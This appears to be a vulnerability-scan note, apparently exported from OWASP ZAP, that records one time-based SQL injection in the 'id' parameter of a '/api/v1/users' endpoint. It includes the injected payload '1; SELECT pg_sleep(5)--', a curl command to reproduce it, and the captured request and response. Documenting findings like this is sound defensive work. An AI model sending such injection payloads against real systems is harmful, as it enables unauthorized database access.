---
occurrenceId: occ-e5f6g7h8
findingId: fin-d1a7e8b9
definitionId: def-40018
pluginId: "40018"
name: "GET /api/v1/users?id=1; SELECT pg_sleep(5)--"
url: "https://my-app.com/api/v1/users"
method: "GET"
param: "id"
attack: "1; SELECT pg_sleep(5)--"
evidence: "time-based SQLi: server response delayed ~5s"
risk: "High"
riskcode: "3"
confidence: "Medium"
sourceid: ""
scan:
  label: "Run 2025-08-19"
domain:
  label: "my-app"
analyst:
  status: "open"
---

# SQL Injection occurrence: time-based

> [!summary]
> - Finding: [[sample-sqli-finding|SQL Injection - /api/v1/users]]
> - Param: `id`
> - Attack: `1; SELECT pg_sleep(5)--`
> - Evidence: response time ~5s
> - Status: open

## Reproduce
```bash
$start = Get-Date; curl -sS "https://my-app.com/api/v1/users?id=1;%20SELECT%20pg_sleep(5)--" -H "Accept: application/json"; $elapsed=(Get-Date)-$start; Write-Host "Elapsed: $($elapsed.TotalSeconds)s"
```

## Traffic

### Request
```
GET /api/v1/users?id=1;%20SELECT%20pg_sleep(5)-- HTTP/1.1
Host: my-app.com
User-Agent: ZAP
Accept: application/json
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Response-Time: 5100ms

[{"id":1,"name":"admin"}]
```
